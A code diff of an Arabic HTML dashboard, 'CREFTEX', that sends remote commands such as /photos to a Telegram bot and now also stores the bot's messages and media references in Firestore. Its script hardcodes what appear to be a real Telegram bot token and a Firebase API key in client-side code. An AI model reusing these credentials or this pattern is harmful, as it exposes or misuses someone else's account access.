@@ -2,327 +2,73 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="theme-color" content="#0a0f1a">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CREFTEX Dashboard</title>
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
-        body {
-            background: radial-gradient(ellipse at top, #0f172a 0%, #050810 60%);
-            color: #e8eef8;
-            min-height: 100vh;
-            padding: 16px;
-            padding-bottom: 40px;
-        }
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
-        }
-
-        /* Header */
-        .header {
-            text-align: center;
-            margin-bottom: 24px;
-            padding: 20px 16px;
-            background: linear-gradient(135deg, rgba(59, 130, 246, 0.1), rgba(6, 182, 212, 0.05));
-            border: 1px solid rgba(59, 130, 246, 0.2);
-            border-radius: 20px;
-            position: relative;
-            overflow: hidden;
-        }
-        .header::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: conic-gradient(from 0deg, transparent, rgba(59, 130, 246, 0.15), transparent 30%);
-            animation: rotate 8s linear infinite;
-        }
-        @keyframes rotate { to { transform: rotate(360deg); } }
-        .header-inner { position: relative; z-index: 1; }
-        h1 {
-            font-size: 26px;
-            font-weight: 800;
-            margin-bottom: 6px;
-            background: linear-gradient(135deg, #60a5fa, #06b6d4, #22d3ee);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, "Segoe UI", Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background: radial-gradient(ellipse at top, #0f172a, #050810 60%); color: #e8eef8; min-height: 100vh; padding: 16px; padding-bottom: 40px; }
+        .container { max-width: 900px; margin: 0 auto; }
+        .header { text-align: center; margin-bottom: 24px; padding: 20px 16px; background: linear-gradient(135deg, rgba(59,130,246,.1), rgba(6,182,212,.05)); border: 1px solid rgba(59,130,246,.2); border-radius: 20px; }
+        h1 { font-size: 26px; font-weight: 800; margin-bottom: 6px; background: linear-gradient(135deg, #60a5fa, #06b6d4, #22d3ee); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .subtitle { color: #94a3b8; font-size: 13px; }
-
-        /* Status Bar */
-        .status {
-            padding: 12px 16px;
-            margin-bottom: 18px;
-            border-radius: 12px;
-            font-size: 14px;
-            font-weight: 600;
-            display: none;
-            text-align: center;
-        }
-        .status.show { display: block; animation: slideDown 0.3s ease; }
-        @keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
-        .status.ok { background: rgba(16, 185, 129, 0.15); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.3); }
-        .status.err { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
-        .status.wait { background: rgba(59, 130, 246, 0.15); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.3); }
-
-        /* Panel */
-        .panel {
-            background: rgba(15, 23, 42, 0.8);
-            border: 1px solid rgba(71, 85, 105, 0.3);
-            border-radius: 16px;
-            padding: 18px;
-            margin-bottom: 16px;
-            backdrop-filter: blur(12px);
-        }
-        .panel-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 14px;
-        }
-        .panel-title {
-            font-size: 16px;
-            font-weight: 700;
-            color: #93c5fd;
-        }
-        .refresh-btn {
-            background: rgba(59, 130, 246, 0.15);
-            border: 1px solid rgba(59, 130, 246, 0.3);
-            color: #60a5fa;
-            padding: 6px 14px;
-            border-radius: 8px;
-            font-size: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.15s;
-        }
-        .refresh-btn:active { transform: scale(0.95); }
-
-        /* Stats */
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-        }
-        .stat {
-            background: rgba(30, 41, 59, 0.6);
-            padding: 14px 8px;
-            border-radius: 12px;
-            text-align: center;
-            border: 1px solid rgba(71, 85, 105, 0.2);
-        }
-        .stat .num {
-            font-size: 22px;
-            font-weight: 800;
-            color: #22d3ee;
-            line-height: 1.2;
-        }
-        .stat .lbl {
-            font-size: 11px;
-            color: #94a3b8;
-            margin-top: 4px;
-        }
-
-        /* Buttons Grid */
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 10px;
-        }
-        .btn {
-            padding: 16px 12px;
-            border-radius: 12px;
-            border: none;
-            font-size: 14px;
-            font-weight: 700;
-            color: #fff;
-            cursor: pointer;
-            transition: transform 0.1s, opacity 0.15s, box-shadow 0.2s;
-            background: linear-gradient(135deg, #3b82f6, #2563eb);
-            box-shadow: 0 4px 14px rgba(59, 130, 246, 0.3);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            min-height: 52px;
-            text-align: center;
-        }
-        .btn:active { transform: scale(0.96); box-shadow: 0 2px 8px rgba(59, 130, 246, 0.4); }
-        .btn.secondary { background: linear-gradient(135deg, #6366f1, #4f46e5); box-shadow: 0 4px 14px rgba(99, 102, 241, 0.3); }
-        .btn.green { background: linear-gradient(135deg, #10b981, #059669); box-shadow: 0 4px 14px rgba(16, 185, 129, 0.3); }
-        .btn.orange { background: linear-gradient(135deg, #f59e0b, #d97706); box-shadow: 0 4px 14px rgba(245, 158, 11, 0.3); }
-        .btn.danger { background: linear-gradient(135deg, #ef4444, #dc2626); box-shadow: 0 4px 14px rgba(239, 68, 68, 0.3); }
-        .btn.purple { background: linear-gradient(135deg, #8b5cf6, #7c3aed); box-shadow: 0 4px 14px rgba(139, 92, 246, 0.3); }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-
-        /* Chat Log */
-        .log {
-            background: #050810;
-            border-radius: 12px;
-            padding: 14px;
-            max-height: 500px;
-            overflow-y: auto;
-            font-size: 13px;
-            line-height: 1.6;
-            direction: ltr;
-            border: 1px solid rgba(71, 85, 105, 0.2);
-        }
-        .log::-webkit-scrollbar { width: 4px; }
-        .log::-webkit-scrollbar-track { background: rgba(30, 41, 59, 0.3); border-radius: 2px; }
-        .log::-webkit-scrollbar-thumb { background: #3b82f6; border-radius: 2px; }
-
-        .msg {
-            padding: 10px 12px;
-            margin-bottom: 8px;
-            border-radius: 10px;
-            background: rgba(30, 41, 59, 0.5);
-            border-left: 3px solid #3b82f6;
-            animation: fadeIn 0.3s ease;
-        }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }
-        .msg.bot { border-left-color: #06b6d4; background: rgba(6, 182, 212, 0.08); }
-        .msg.user { border-left-color: #10b981; background: rgba(16, 185, 129, 0.08); }
-        .msg.error { border-left-color: #ef4444; background: rgba(239, 68, 68, 0.08); }
-
+        .status { padding: 12px 16px; margin-bottom: 18px; border-radius: 12px; font-size: 14px; font-weight: 600; display: none; text-align: center; }
+        .status.show { display: block; }
+        .status.ok { background: rgba(16,185,129,.15); color: #34d399; border: 1px solid rgba(16,185,129,.3); }
+        .status.err { background: rgba(239,68,68,.15); color: #f87171; border: 1px solid rgba(239,68,68,.3); }
+        .status.wait { background: rgba(59,130,246,.15); color: #60a5fa; border: 1px solid rgba(59,130,246,.3); }
+        .panel { background: rgba(15,23,42,.8); border: 1px solid rgba(71,85,105,.3); border-radius: 16px; padding: 18px; margin-bottom: 16px; }
+        .panel-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; }
+        .panel-title { font-size: 16px; font-weight: 700; color: #93c5fd; }
+        .refresh-btn { background: rgba(59,130,246,.15); border: 1px solid rgba(59,130,246,.3); color: #60a5fa; padding: 6px 14px; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; }
+        .stats { display: grid; grid-template-columns: repeat(3,1fr); gap: 10px; }
+        .stat { background: rgba(30,41,59,.6); padding: 14px 8px; border-radius: 12px; text-align: center; }
+        .stat .num { font-size: 22px; font-weight: 800; color: #22d3ee; }
+        .stat .lbl { font-size: 11px; color: #94a3b8; margin-top: 4px; }
+        .grid { display: grid; grid-template-columns: repeat(2,1fr); gap: 10px; }
+        .btn { padding: 16px 12px; border-radius: 12px; border: none; font-size: 14px; font-weight: 700; color: #fff; cursor: pointer; background: linear-gradient(135deg, #3b82f6, #2563eb); display: flex; align-items: center; justify-content: center; min-height: 52px; text-align: center; }
+        .btn:active { transform: scale(.96); }
+        .btn.secondary { background: linear-gradient(135deg, #6366f1, #4f46e5); }
+        .btn.green { background: linear-gradient(135deg, #10b981, #059669); }
+        .btn.orange { background: linear-gradient(135deg, #f59e0b, #d97706); }
+        .btn.danger { background: linear-gradient(135deg, #ef4444, #dc2626); }
+        .btn.purple { background: linear-gradient(135deg, #8b5cf6, #7c3aed); }
+        .log { background: #050810; border-radius: 12px; padding: 14px; max-height: 600px; overflow-y: auto; direction: ltr; border: 1px solid rgba(71,85,105,.2); }
+        .msg { padding: 10px 12px; margin-bottom: 8px; border-radius: 10px; background: rgba(30,41,59,.5); border-left: 3px solid #3b82f6; }
+        .msg.bot { border-left-color: #06b6d4; background: rgba(6,182,212,.08); }
+        .msg.user { border-left-color: #10b981; background: rgba(16,185,129,.08); }
         .msg-time { color: #64748b; font-size: 11px; margin-bottom: 4px; direction: rtl; }
         .msg-from { color: #93c5fd; font-weight: 700; font-size: 12px; direction: rtl; }
-        .msg-text {
-            color: #e2e8f0;
-            direction: rtl;
-            text-align: right;
-            margin-top: 6px;
-            white-space: pre-wrap;
-            word-break: break-word;
-            font-size: 13px;
-        }
-        .msg-img {
-            max-width: 100%;
-            border-radius: 8px;
-            margin-top: 8px;
-            display: block;
-            border: 1px solid rgba(71, 85, 105, 0.3);
-        }
-        .msg-video {
-            max-width: 100%;
-            border-radius: 8px;
-            margin-top: 8px;
-            display: block;
-        }
-
-        .empty {
-            text-align: center;
-            color: #64748b;
-            padding: 40px 20px;
-            font-size: 14px;
-            direction: rtl;
-        }
-        .empty-icon { font-size: 48px; margin-bottom: 12px; opacity: 0.5; }
-
-        /* Spinner */
-        .spinner {
-            display: inline-block;
-            width: 14px;
-            height: 14px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-top-color: #fff;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-            vertical-align: middle;
-            margin-left: 6px;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        /* Auto-refresh indicator */
-        .auto-indicator {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 11px;
-            color: #64748b;
-            margin-top: 10px;
-            justify-content: center;
-        }
-        .dot {
-            width: 6px;
-            height: 6px;
-            border-radius: 50%;
-            background: #10b981;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-
-        /* Modal for full image */
-        .modal {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.95);
-            z-index: 9999;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
+        .msg-text { color: #e2e8f0; direction: rtl; text-align: right; margin-top: 6px; white-space: pre-wrap; word-break: break-word; font-size: 13px; }
+        .msg-img { max-width: 100%; border-radius: 8px; margin-top: 8px; display: block; border: 1px solid rgba(71,85,105,.3); cursor: pointer; }
+        .msg-video { max-width: 100%; border-radius: 8px; margin-top: 8px; display: block; }
+        .empty { text-align: center; color: #64748b; padding: 40px 20px; font-size: 14px; direction: rtl; }
+        .empty-icon { font-size: 48px; margin-bottom: 12px; opacity: .5; }
+        .modal { position: fixed; inset: 0; background: rgba(0,0,0,.95); z-index: 9999; display: none; align-items: center; justify-content: center; padding: 20px; }
         .modal.show { display: flex; }
         .modal img { max-width: 100%; max-height: 90vh; border-radius: 12px; }
-        .modal-close {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.1);
-            border: none;
-            color: #fff;
-            font-size: 24px;
-            cursor: pointer;
-        }
+        .modal-close { position: absolute; top: 20px; right: 20px; width: 40px; height: 40px; border-radius: 50%; background: rgba(255,255,255,.1); border: none; color: #fff; font-size: 24px; cursor: pointer; }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Header -->
         <div class="header">
-            <div class="header-inner">
-                <h1>⚡ CREFTEX</h1>
-                <div class="subtitle">لوحة التحكم عن بُعد</div>
-            </div>
+            <h1>⚡ CREFTEX</h1>
+            <div class="subtitle">لوحة التحكم — Firestore</div>
         </div>
 
-        <!-- Status -->
         <div class="status" id="status"></div>
 
-        <!-- Stats -->
         <div class="panel">
-            <div class="panel-header">
-                <div class="panel-title">📊 الإحصائيات</div>
-            </div>
+            <div class="panel-header"><div class="panel-title">📊 الإحصائيات</div></div>
             <div class="stats">
-                <div class="stat">
-                    <div class="num" id="statUpdates">0</div>
-                    <div class="lbl">تحديثات</div>
-                </div>
-                <div class="stat">
-                    <div class="num" id="statPhotos">0</div>
-                    <div class="lbl">صور</div>
-                </div>
-                <div class="stat">
-                    <div class="num" id="statLast" style="font-size:14px">—</div>
-                    <div class="lbl">آخر فحص</div>
-                </div>
+                <div class="stat"><div class="num" id="statMsgs">0</div><div class="lbl">رسائل</div></div>
+                <div class="stat"><div class="num" id="statImgs">0</div><div class="lbl">صور</div></div>
+                <div class="stat"><div class="num" id="statLast" style="font-size:12px">—</div><div class="lbl">آخر تحديث</div></div>
             </div>
         </div>
 
-        <!-- Commands -->
         <div class="panel">
-            <div class="panel-header">
-                <div class="panel-title">🎛 الأوامر السريعة</div>
-            </div>
+            <div class="panel-header"><div class="panel-title">🎛 الأوامر</div></div>
             <div class="grid">
                 <button class="btn" onclick="sendCmd('/menu')">📋 القائمة</button>
                 <button class="btn secondary" onclick="sendCmd('/photos')">📸 كل الصور</button>
@@ -337,240 +83,249 @@
             </div>
         </div>
 
-        <!-- Chat -->
         <div class="panel">
             <div class="panel-header">
-                <div class="panel-title">💬 الرسائل</div>
-                <button class="refresh-btn" onclick="loadUpdates(true)">🔄 تحديث</button>
+                <div class="panel-title">💬 المحادثة الكاملة</div>
+                <button class="refresh-btn" onclick="loadMessages(true)">🔄 تحديث</button>
             </div>
             <div class="log" id="logBox">
-                <div class="empty">
-                    <div class="empty-icon">📭</div>
-                    لا رسائل بعد — اضغط تحديث
-                </div>
-            </div>
-            <div class="auto-indicator">
-                <div class="dot"></div>
-                <span>تحديث تلقائي كل 10 ثواني</span>
+                <div class="empty"><div class="empty-icon">📭</div>لا رسائل بعد</div>
             </div>
         </div>
     </div>
 
-    <!-- Modal for full image -->
     <div class="modal" id="imgModal" onclick="closeModal()">
         <button class="modal-close" onclick="closeModal()">×</button>
         <img id="modalImg" src="" alt="">
     </div>
 
     <script>
-        // ============================================
-        //  إعدادات البوت
-        // ============================================
+        // ⚠️ الإعدادات
         const TELEGRAM_BOT_TOKEN = "8965774628:AAHiRk5BzVgGXJOMURMJyNNjHnpDj7MUAjM";
         const TELEGRAM_CHAT_ID = "8599240795";
+        const FIREBASE_API_KEY = "AIzaSyBvzfJOOjRFZnTgTUrwEZQPr8Ba7zKKlNg";
+        const FIREBASE_PROJECT_ID = "hhhxh-5ebe4";
 
-        const API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
-        const FILE_API = `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}`;
+        const TG_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+        const TG_FILE = `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}`;
+        const FS_API = `https://firestore.googleapis.com/v1/projects/${FIREBASE_PROJECT_ID}/databases/(default)/documents/messages`;
 
         let lastUpdateId = 0;
+        let messageCache = {};
         let photoCount = 0;
-        let sentMessageIds = new Set();
 
-        // ============================================
-        //  إرسال أمر للبوت
-        // ============================================
+        // ═══════════════════════════════════════
+        //  إرسال أمر
+        // ═══════════════════════════════════════
         async function sendCmd(cmd) {
-            showStatus(`⏳ جاري إرسال: ${cmd}`, 'wait');
+            showStatus(`⏳ إرسال: ${cmd}`, 'wait');
             try {
-                const res = await fetch(`${API}/sendMessage`, {
+                const res = await fetch(`${TG_API}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: cmd
-                    })
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: cmd })
                 });
                 const data = await res.json();
                 if (data.ok) {
-                    showStatus(`✅ تم الإرسال: ${cmd}`, 'ok');
-                    // اسحب الرد بعد 2 ثانية
-                    setTimeout(() => loadUpdates(true), 2000);
+                    showStatus(`✅ تم: ${cmd}`, 'ok');
+                    setTimeout(() => loadMessages(true), 2500);
                 } else {
                     showStatus(`❌ فشل: ${data.description}`, 'err');
                 }
-            } catch (e) {
-                showStatus(`❌ خطأ: ${e.message}`, 'err');
-            }
+            } catch (e) { showStatus(`❌ خطأ: ${e.message}`, 'err'); }
         }
 
-        // ============================================
-        //  جلب التحديثات من البوت
-        // ============================================
-        async function loadUpdates(showLoading) {
-            if (showLoading) {
-                document.getElementById('statLast').textContent = 'فحص...';
-            }
+        // ═══════════════════════════════════════
+        //  جلب الرسائل الواردة (getUpdates)
+        // ═══════════════════════════════════════
+        async function pullIncoming() {
+            try {
+                const offset = lastUpdateId === 0 ? 0 : lastUpdateId + 1;
+                const res = await fetch(`${TG_API}/getUpdates?offset=${offset}&limit=100`);
+                const data = await res.json();
+                if (!data.ok) return;
+
+                for (const u of (data.result || [])) {
+                    lastUpdateId = Math.max(lastUpdateId, u.update_id);
+                    const msg = u.message;
+                    if (!msg) continue;
+
+                    // منع التكرار
+                    const key = `in_${msg.message_id}`;
+                    if (messageCache[key]) continue;
+                    messageCache[key] = true;
+
+                    // احفظ في Firestore (لو ما كان محفوظ)
+                    if (msg.text) {
+                        await saveToFirestore({
+                            chat_id: msg.chat.id,
+                            type: 'text',
+                            text: msg.text,
+                            time_ms: msg.date * 1000,
+                            from_user: true
+                        });
+                    } else if (msg.photo && msg.photo.length > 0) {
+                        const fileId = msg.photo[msg.photo.length - 1].file_id;
+                        await saveToFirestore({
+                            chat_id: msg.chat.id,
+                            type: 'photo',
+                            file_id: fileId,
+                            caption: msg.caption || '',
+                            time_ms: msg.date * 1000,
+                            from_user: true
+                        });
+                    }
+                }
+            } catch (e) { console.error(e); }
+        }
+
+        // ═══════════════════════════════════════
+        //  حفظ رسالة في Firestore
+        // ═══════════════════════════════════════
+        async function saveToFirestore(obj) {
+            try {
+                const fields = {};
+                for (const [k, v] of Object.entries(obj)) {
+                    if (typeof v === 'number') fields[k] = { integerValue: String(v) };
+                    else if (typeof v === 'boolean') fields[k] = { booleanValue: v };
+                    else fields[k] = { stringValue: String(v) };
+                }
+
+                await fetch(`${FS_API}?key=${FIREBASE_API_KEY}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ fields })
+                });
+            } catch (e) { console.error(e); }
+        }
+
+        // ═══════════════════════════════════════
+        //  جلب كل الرسائل من Firestore
+        // ═══════════════════════════════════════
+        async function loadMessages(showStatus2) {
+            if (showStatus2) showStatus('⏳ جلب الرسائل...', 'wait');
 
             try {
-                // نجلب من البداية (offset=0) لو أول مرة — لنجلب كل الرسائل
-                const offset = lastUpdateId === 0 ? 0 : lastUpdateId + 1;
-                const res = await fetch(`${API}/getUpdates?offset=${offset}&limit=100`);
+                const res = await fetch(`${FS_API}?key=${FIREBASE_API_KEY}&pageSize=500`);
                 const data = await res.json();
 
-                if (!data.ok) {
-                    showStatus(`❌ فشل الجلب: ${data.description}`, 'err');
+                if (!data.documents) {
+                    document.getElementById('logBox').innerHTML = '<div class="empty"><div class="empty-icon">📭</div>لا رسائل بعد</div>';
                     return;
                 }
 
-                const logBox = document.getElementById('logBox');
-                const updates = data.result || [];
+                // رتب حسب الوقت
+                const docs = data.documents.map(d => {
+                    const f = d.fields || {};
+                    return {
+                        type: f.type?.stringValue || 'text',
+                        text: f.text?.stringValue || '',
+                        file_id: f.file_id?.stringValue || '',
+                        caption: f.caption?.stringValue || '',
+                        time_ms: parseInt(f.time_ms?.integerValue || '0'),
+                        from_user: f.from_user?.booleanValue || false
+                    };
+                }).sort((a, b) => a.time_ms - b.time_ms);
 
-                // أول مرة → امسح
-                if (lastUpdateId === 0) {
-                    logBox.innerHTML = '';
-                }
-
-                if (updates.length === 0 && lastUpdateId === 0) {
-                    logBox.innerHTML = `
-                        <div class="empty">
-                            <div class="empty-icon">📭</div>
-                            لا رسائل بعد — أرسل أمرًا للبوت أولًا
-                        </div>
-                    `;
-                    document.getElementById('statLast').textContent = '—';
-                    return;
-                }
-
-                for (const u of updates) {
-                    lastUpdateId = Math.max(lastUpdateId, u.update_id);
-                    const msg = u.message || u.edited_message || u.channel_post;
-                    if (msg) renderMessage(msg);
-                }
-
-                document.getElementById('statUpdates').textContent = lastUpdateId;
+                // حدّث الإحصائيات
+                document.getElementById('statMsgs').textContent = docs.length;
+                photoCount = docs.filter(d => d.type === 'photo').length;
+                document.getElementById('statImgs').textContent = photoCount;
                 document.getElementById('statLast').textContent = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
 
-                // scroll to bottom
+                // اعرض
+                const logBox = document.getElementById('logBox');
+                logBox.innerHTML = '';
+
+                for (const doc of docs) {
+                    renderMsg(doc, logBox);
+                }
+
                 logBox.scrollTop = logBox.scrollHeight;
 
+                if (showStatus2) showStatus(`✅ ${docs.length} رسالة`, 'ok');
             } catch (e) {
-                showStatus(`❌ خطأ الشبكة: ${e.message}`, 'err');
+                if (showStatus2) showStatus(`❌ خطأ: ${e.message}`, 'err');
             }
         }
 
-        // ============================================
+        // ═══════════════════════════════════════
         //  عرض رسالة
-        // ============================================
-        function renderMessage(msg) {
-            // منع التكرار
-            if (sentMessageIds.has(msg.message_id)) return;
-            sentMessageIds.add(msg.message_id);
+        // ═══════════════════════════════════════
+        function renderMsg(doc, logBox) {
+            const time = new Date(doc.time_ms).toLocaleString('ar-EG', { hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit' });
+            const isUser = doc.from_user;
 
-            const logBox = document.getElementById('logBox');
+            const el = document.createElement('div');
+            el.className = 'msg ' + (isUser ? 'user' : 'bot');
 
-            // إزالة "لا رسائل بعد" إن وجدت
-            const emptyDiv = logBox.querySelector('.empty');
-            if (emptyDiv) emptyDiv.remove();
+            let content = `<div class="msg-time">${time}</div>`;
+            content += `<div class="msg-from">${isUser ? '👤 أنت' : '🤖 البوت'}</div>`;
 
-            const from = msg.from?.first_name || 'Unknown';
-            const isBot = msg.from?.is_bot || false;
-            const time = new Date(msg.date * 1000).toLocaleString('ar-EG', {
-                hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit'
-            });
-
-            const item = document.createElement('div');
-            item.className = 'msg ' + (isBot ? 'bot' : 'user');
-
-            let content = `
-                <div class="msg-time">${time}</div>
-                <div class="msg-from">${isBot ? '🤖 ' : '👤 '}${escapeHtml(from)}</div>
-            `;
-
-            if (msg.photo && msg.photo.length > 0) {
-                // صورة — استخدم أكبر حجم
-                const fileId = msg.photo[msg.photo.length - 1].file_id;
-                const caption = msg.caption || '';
-                content += `<div class="msg-text">📸 صورة${caption ? ' — ' + escapeHtml(caption) : ''}</div>`;
-                content += `<img class="msg-img" data-file="${fileId}" alt="photo" onclick="openModal(this.src)">`;
-                photoCount++;
-                document.getElementById('statPhotos').textContent = photoCount;
-            } else if (msg.video) {
-                const fileId = msg.video.file_id;
-                content += `<div class="msg-text">🎥 فيديو${msg.caption ? ' — ' + escapeHtml(msg.caption) : ''}</div>`;
-                content += `<video class="msg-video" controls data-file="${fileId}"></video>`;
-            } else if (msg.document) {
-                content += `<div class="msg-text">📎 ملف: ${escapeHtml(msg.document.file_name || 'ملف')}</div>`;
-            } else if (msg.audio) {
-                const fileId = msg.audio.file_id;
-                content += `<div class="msg-text">🎤 صوتي</div>`;
-                content += `<audio controls data-file="${fileId}"></audio>`;
-            } else if (msg.text) {
-                const text = msg.text;
-                content += `<div class="msg-text">${escapeHtml(text)}</div>`;
+            if (doc.type === 'photo' && doc.file_id) {
+                content += `<div class="msg-text">📸 صورة${doc.caption ? ' — ' + escapeHtml(doc.caption) : ''}</div>`;
+                content += `<img class="msg-img" data-file="${doc.file_id}" onclick="openModal(this.src)">`;
+            } else if (doc.type === 'video' && doc.file_id) {
+                content += `<div class="msg-text">🎥 فيديو</div>`;
+                content += `<video class="msg-video" controls data-file="${doc.file_id}"></video>`;
+            } else if (doc.type === 'audio' && doc.file_id) {
+                content += `<div class="msg-text">🎤 صوت</div>`;
+                content += `<audio controls data-file="${doc.file_id}"></audio>`;
+            } else if (doc.type === 'document' && doc.file_id) {
+                content += `<div class="msg-text">📎 ملف: ${escapeHtml(doc.text)}</div>`;
             } else {
-                content += `<div class="msg-text">—</div>`;
+                content += `<div class="msg-text">${escapeHtml(doc.text)}</div>`;
             }
 
-            item.innerHTML = content;
-            logBox.appendChild(item);
+            el.innerHTML = content;
+            logBox.appendChild(el);
 
-            // جلب الملفات (صور، فيديو، صوت)
-            const mediaEl = item.querySelector('[data-file]');
-            if (mediaEl) loadMedia(mediaEl.getAttribute('data-file'), mediaEl);
+            // جلب الصورة من Telegram
+            const mediaEl = el.querySelector('[data-file]');
+            if (mediaEl) loadMedia(doc.file_id, mediaEl);
         }
 
-        // ============================================
-        //  جلب ملف من Telegram
-        // ============================================
         async function loadMedia(fileId, el) {
             try {
-                const res = await fetch(`${API}/getFile?file_id=${fileId}`);
+                const res = await fetch(`${TG_API}/getFile?file_id=${fileId}`);
                 const data = await res.json();
                 if (data.ok && data.result.file_path) {
-                    el.src = `${FILE_API}/${data.result.file_path}`;
-                } else {
-                    el.alt = 'فشل تحميل الصورة';
+                    el.src = `${TG_FILE}/${data.result.file_path}`;
                 }
-            } catch (e) {
-                console.error('media load err', e);
-            }
+            } catch (e) { console.error(e); }
         }
 
-        // ============================================
-        //  Modal للصورة
-        // ============================================
-        function openModal(src) {
-            const m = document.getElementById('imgModal');
-            const img = document.getElementById('modalImg');
-            img.src = src;
-            m.classList.add('show');
-        }
-        function closeModal() {
-            document.getElementById('imgModal').classList.remove('show');
-        }
-
-        // ============================================
+        // ═══════════════════════════════════════
         //  Helpers
-        // ============================================
+        // ═══════════════════════════════════════
         function showStatus(msg, type) {
             const s = document.getElementById('status');
             s.textContent = msg;
             s.className = 'status show ' + type;
-            clearTimeout(window.__statusTm);
-            window.__statusTm = setTimeout(() => s.classList.remove('show'), 4000);
+            clearTimeout(window.__st);
+            window.__st = setTimeout(() => s.classList.remove('show'), 4000);
         }
 
         function escapeHtml(s) {
-            return String(s).replace(/[&<>"']/g, c => ({
-                '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
-            }[c]));
+            return String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
         }
 
-        // ============================================
+        function openModal(src) {
+            document.getElementById('modalImg').src = src;
+            document.getElementById('imgModal').classList.add('show');
+        }
+        function closeModal() { document.getElementById('imgModal').classList.remove('show'); }
+
+        // ═══════════════════════════════════════
         //  التشغيل
-        // ============================================
-        loadUpdates();
-        setInterval(() => loadUpdates(false), 10000);
+        // ═══════════════════════════════════════
+        async function refresh() {
+            await pullIncoming();  // اجلب الجديد من تيليجرام
+            await loadMessages(false);  // اعرض من Firestore
+        }
+
+        refresh();
+        setInterval(refresh, 15000);
     </script>
 </body>
 </html>
